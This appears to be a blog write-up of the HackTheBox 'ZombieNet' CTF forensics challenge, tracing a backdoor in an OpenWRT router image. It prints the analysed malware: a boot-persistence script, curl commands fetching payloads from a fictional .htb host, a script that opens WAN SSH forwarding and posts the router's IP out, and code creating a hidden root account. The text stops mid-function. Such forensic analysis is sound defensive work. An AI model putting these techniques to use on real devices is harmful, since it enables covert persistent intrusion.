			<description><![CDATA[%!s(<nil>)]]></description>
			<content type="html"><![CDATA[<p>The second forensics challenge for HackTheBox University CTF 2023 was called ZombieNet.  It gave participants an image of an OpenWRT router, and asked them to determine how the attackers were maintaining persistent access to the device.  This post will walk through the steps I took to solve the challenge.</p>
<h2 id="challenge-description">Challenge Description</h2>
<p>There was an attack on the NOC (Network Operations Center) of Hackster University and as a result, a large number of Network devices were compromised! After successfully fending off the attack the devices were decommissioned and sent off to be inspected. However, there is a strong suspicion among your peers that not all devices were identified! They suspect that the attackers managed to maintain access to the network despite our team&rsquo;s efforts! It&rsquo;s your job to investigate a recently used disk image and uncover how the Zombies maintain their access!</p>
<h2 id="the-image">The Image</h2>
<p>The image provided was a small disk image file called <code>openwrt-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</code>. I first attempted to analyze the image using Autopsy and TheSleuthKit, but they were unable to handle the binary firmware image.  I then used <code>binwalk</code> to extract the contents of the image, and found a full Linux filesystem.</p>
<p><img src="./images/1-router_filesystem.png" alt="Router Filesystem"></p>
<p>I began by trying to manually review the filesystem for anomalies, but with the large number of files and directories within the image, I quickly decided to take a different approach.</p>
<p>The main draw of <code>binwalk</code> is that it has the ability to perform signature scanning on a file - that is, it can search for magic numbers and other signatures that indicate the presence of a particular file type.  That is how it was able to retrieve all of the above files from the image.</p>
<p>But the <code>binwalk</code> signature scanning capabilities are not limited to just files it finds within the image - it can also analyze the image itself to determine the signature of the firmware.</p>
<p>Running <code>binwalk</code> without the <code>-e</code> flag will perform a signature scan on the image, and return the results.</p>
<p><img src="./images/2-binwalk_signature.png" alt="Binwalk Signature Scan"></p>
<p>As I highlighted in the image, this is a <!-- raw HTML omitted -->MIPS OpenWrt Linux-5.15.137<!-- raw HTML omitted --> image.  And from the name of the file, we know the exact version of OpenWRT that was used to create the image.  This is important, because it means we can download the source code for that version of OpenWRT, and compare the two to determine which changes were made in the image supplied to us.  If we can figure out what is different, the list of potentially malicious files to review will be much smaller.</p>
<p>After a quick Google search, I found the following site: <a href="https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition">https://openwrt.org/inbox/toh/xiaomi/xiaomi_mi_router_4a_gigabit_edition</a>, which contains a link to a firmware image for this exact same router.  The link is:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin">https://downloads.openwrt.org/releases/23.05.0/targets/ramips/mt7621/openwrt-23.05.0-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>This is close, but not the exact same image.  This is version 23.05.0, whereas the image we were given, as indicated by <code>binwalk</code>, is 23.05.137.  Although the link to version 23.05.137 doesn&rsquo;t appear to be listed, I was able to find it by modifying the URL slightly:</p>
<p><a href="https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin">https://downloads.openwrt.org/releases/23.05.137/targets/ramips/mt7621/openwrt-23.05.137-ramips-mt7621-xiaomi_mi-router-4a-gigabit-squashfs-sysupgrade.bin</a></p>
<p>Next, I extracted the contents of the two images, and used the <code>diff</code> command with the <code>-r</code> flag to recursively compare the directories, and the <code>-q</code> to only output the files that were different.  Then, I used <code>grep</code> to filter by files that only appeared in the modified image we were given.  The command I used was:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>diff -qr _openwrt-image-original/ factory_images/_openwrt-image-factory/ | grep <span style="color:#e6db74">&#34;Only in _openwrt&#34;</span>
</span></span></code></pre></div><p><img src="./images/3-diff_results.png" alt="Output of command"></p>
<p>There are a number of suspicious files in this list, but one stands out: <!-- raw HTML omitted -->/etc/rc.d/S95dead-reanimation<!-- raw HTML omitted -->.  This is a startup script that will be executed when the router boots up; it is clearly not standard, and is also themed like the rest of the CTF.</p>
<h2 id="dead-reanimation">dead-reanimation</h2>
<p>The <code>S95dead-reanimation</code> script is actually an OpenRC startup script, which is a symbolic link that runs another script whenever the router starts.  This is a well known feature of how OpenRC works, but we can confirm it by looking at the contents of the <code>/etc/rc.d</code> directory:</p>
<p><img src="./images/4-openrc_startup_script.png" alt="OpenRC Startup Script"></p>
<p>Let&rsquo;s look at the script this link points to, <code>/etc/init.d/dead-reanimation</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh /etc/rc.common
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>START<span style="color:#f92672">=</span><span style="color:#ae81ff">95</span>
</span></span><span style="display:flex;"><span>USE_PROCD<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>PROG<span style="color:#f92672">=</span>/sbin/zombie_runner
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>start_service<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>	procd_open_instance
</span></span><span style="display:flex;"><span>	procd_set_param command $PROG
</span></span><span style="display:flex;"><span>	procd_set_param respawn <span style="color:#e6db74">${</span>respawn_threshold<span style="color:#66d9ef">:-</span>3600<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_timeout<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span> <span style="color:#e6db74">${</span>respawn_retry<span style="color:#66d9ef">:-</span>5<span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>	procd_close_instance
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span> 
</span></span></code></pre></div><p>This is simple service script, which runs <code>/sbin/zombie_runner</code> on boot. Let&rsquo;s look at <code>/sbin/zombie_runner</code> next:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span> 
</span></span><span style="display:flex;"><span>    /usr/bin/dead-reanimation
</span></span><span style="display:flex;"><span>    sleep <span style="color:#ae81ff">600</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>exit <span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p>This script is also simple - it runs <code>/usr/bin/dead-reanimation</code> every 10 minutes.  When we go to investigate this script, we find that it is a binary file, which can be seen with the <code>file</code> command:</p>
<p><img src="./images/5-dead_reanimation_binary.png" alt="Dead Reanimation Binary"></p>
<p>We know that the binary is a MIPS32 binary from the output of the <code>file</code> command.  The next step is to load it into Ghidra, and analyze it.  Once auto-analysis is complete, we can follow the calls from the entry point to determine what the binary does.</p>
<p>The first interesting function is <code>FUN_00400cf</code>, which looks as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_00400cf4</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined4 local_a8;
</span></span><span style="display:flex;"><span>  undefined4 local_a4;
</span></span><span style="display:flex;"><span>  undefined4 local_a0;
</span></span><span style="display:flex;"><span>  undefined4 local_9c;
</span></span><span style="display:flex;"><span>  undefined4 local_98;
</span></span><span style="display:flex;"><span>  undefined local_94;
</span></span><span style="display:flex;"><span>  undefined4 local_90;
</span></span><span style="display:flex;"><span>  undefined4 local_8c;
</span></span><span style="display:flex;"><span>  undefined4 local_88;
</span></span><span style="display:flex;"><span>  undefined4 local_84;
</span></span><span style="display:flex;"><span>  undefined2 local_80;
</span></span><span style="display:flex;"><span>  undefined auStack_7c [<span style="color:#ae81ff">60</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_40 [<span style="color:#ae81ff">56</span>];
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_a8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_a4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4e47e</span>;
</span></span><span style="display:flex;"><span>  local_a0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4e937069</span>;
</span></span><span style="display:flex;"><span>  local_9c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8ec5e155</span>;
</span></span><span style="display:flex;"><span>  local_98 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3af55fc1</span>;
</span></span><span style="display:flex;"><span>  local_94 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  local_90 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9a6f65f0</span>;
</span></span><span style="display:flex;"><span>  local_8c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xadf4f27e</span>;
</span></span><span style="display:flex;"><span>  local_88 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4a8c4663</span>;
</span></span><span style="display:flex;"><span>  local_84 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x9082ea40</span>;
</span></span><span style="display:flex;"><span>  local_80 <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_7c,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_40,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_7c);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00400c04</span>(auStack_40);
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_7c,<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_00400b20</span>(auStack_40,<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_90);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_a8);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After renaming a few variables and removing some of the Ghidra decompilation artifacts, the function looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">downloadAndExecute</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_1,<span style="color:#f92672">&amp;</span>DAT_00400f74,<span style="color:#ae81ff">0x3a</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(file_2,<span style="color:#f92672">&amp;</span>DAT_00400fb0,<span style="color:#ae81ff">0x37</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>(file_2);
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_1,<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">access</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">curl</span>(file_2,<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">chmod</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2,<span style="color:#ae81ff">0x1ff</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>url_1);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, I grabbed the contents of the two URLs and files from the memory of the binary, along with the key used to XOR them. I plugged all of them into CyberChef, and got the following results:</p>
<p><img src="./images/6-cyberchef_decode.png" alt="CyberChef Decode"></p>
<p>The first command (translated) is <code>curl http://configs.router.htb/reanimate.sh_jEzOWMtZTUxOS00 &gt; /tmp/reanimate.sh</code></p>
<p>The second command (translated) is <code>curl http://configs.router.htb/dead_reanimated_mNmZTMtNjU3YS00 &gt; /tmp/dead_reanimated</code></p>
<p>I ran both of these commands, and was able to retrieve the two files.</p>
<h2 id="reanimatesh">reanimate.sh</h2>
<p>The <code>reanimate.sh</code> script looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>WAN_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show pppoe-wan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>ROUTER_IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ip -4 -o addr show br-lan | awk <span style="color:#e6db74">&#39;{print $4}&#39;</span> | cut -d <span style="color:#e6db74">&#34;/&#34;</span> -f 1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CONFIG<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config redirect             \n\t              
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest &#39;lan&#39;           \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option target &#39;DNAT&#39;        \n\t 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option name &#39;share&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src &#39;wan&#39;            \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option src_dport &#39;61337&#39;    \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_port &#39;22&#39;       \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option family &#39;ipv4&#39;        \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	list proto &#39;tcpudp&#39;         \n\t
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">	option dest_ip &#39;</span><span style="color:#e6db74">${</span>ROUTER_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -e $CONFIG &gt;&gt; /etc/config/firewall
</span></span><span style="display:flex;"><span>/etc/init.d/firewall restart
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -X POST -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#34;auth_token=SFRCe1owbWIxM3NfaDR2M19pbmY&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;ip&#34;:&#34;&#39;</span><span style="color:#e6db74">${</span>WAN_IP<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;}&#39;</span> http://configs.router.htb/reanimate
</span></span></code></pre></div><p>The code creates a firewall rule that redirects traffic from port 61337 to port 22, allowing SSH access to the router from the WAN. It then sends a POST request to <a href="http://configs.router.htb/reanimate">http://configs.router.htb/reanimate</a>, with the WAN IP address of the router, presumably to notify the attackers that the router is back online.</p>
<p>If we Base64 decode the auth token, we get <code>HTB{Z0mb13s_h4v3_inf</code>, which is the first half of the flag.</p>
<h2 id="dead_reanimated">dead_reanimated</h2>
<p>The <code>dead_reanimated</code> binary is a MIPS32 binary, just like <code>dead-reanimation</code>.  I loaded it into Ghidra, and began analyzing it.  This binary has a main function which Ghidra was able to identify, and it looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>pFVar4;
</span></span><span style="display:flex;"><span>  __uid_t _Var5;
</span></span><span style="display:flex;"><span>  passwd <span style="color:#f92672">*</span>ppVar6;
</span></span><span style="display:flex;"><span>  undefined4 uVar7;
</span></span><span style="display:flex;"><span>  undefined uStack_169;
</span></span><span style="display:flex;"><span>  undefined4 local_168;
</span></span><span style="display:flex;"><span>  undefined auStack_164 [<span style="color:#ae81ff">252</span>];
</span></span><span style="display:flex;"><span>  undefined auStack_68 [<span style="color:#ae81ff">44</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> acStack_3c [<span style="color:#ae81ff">28</span>];
</span></span><span style="display:flex;"><span>  undefined4 local_20;
</span></span><span style="display:flex;"><span>  undefined4 local_1c;
</span></span><span style="display:flex;"><span>  undefined4 local_18;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_20._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;z&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;m&#39;</span>;
</span></span><span style="display:flex;"><span>  local_20._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;b&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;_&#39;</span>;
</span></span><span style="display:flex;"><span>  local_1c._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;l&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._0_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;o&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._1_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._2_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;d&#39;</span>;
</span></span><span style="display:flex;"><span>  local_18._3_1_ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(auStack_68,<span style="color:#e6db74">&#34;d2c0ba035fe58753c648066d76fa793bea92ef29&#34;</span>,<span style="color:#ae81ff">0x29</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(acStack_3c,<span style="color:#f92672">&amp;</span>DAT_00400d50,<span style="color:#ae81ff">0x1b</span>);
</span></span><span style="display:flex;"><span>  sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(acStack_3c);
</span></span><span style="display:flex;"><span>  pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(sVar1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init_crypto_lib</span>(auStack_68,acStack_3c,pvVar2);
</span></span><span style="display:flex;"><span>  iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_easy_init</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x2712</span>,<span style="color:#e6db74">&#34;http://callback.router.htb&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_setopt</span>(iVar3,<span style="color:#ae81ff">0x271f</span>,pvVar2);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_perform</span>(iVar3);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_easy_cleanup</span>(iVar3);
</span></span><span style="display:flex;"><span>    pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;/proc/sys/kernel/hostname&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
</span></span><span style="display:flex;"><span>    local_168 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(auStack_164,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0xfc</span>);
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>(<span style="color:#f92672">&amp;</span>local_168,<span style="color:#ae81ff">0x100</span>,<span style="color:#ae81ff">1</span>,pFVar4);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>    (<span style="color:#f92672">&amp;</span>uStack_169)[sVar1] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_168,<span style="color:#e6db74">&#34;HSTERUNI-GW-01&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar3 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      _Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getuid</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ((_Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (_Var5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>(), _Var5 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>        ppVar6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getpwnam</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>local_20);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (ppVar6 <span style="color:#f92672">==</span> (passwd <span style="color:#f92672">*</span>)<span style="color:#ae81ff">0x0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">system</span>(
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;opkg update &amp;&amp; opkg install shadow-useradd &amp;&amp; useradd -s /bin/ash -g 0 -u 0 -o -M z ombie_lord&#34;</span>
</span></span><span style="display:flex;"><span>                );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        pFVar4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#34;passwd zombie_lord&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fprintf</span>(pFVar4,<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,pvVar2,pvVar2);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pclose</span>(pFVar4);
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      uVar7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
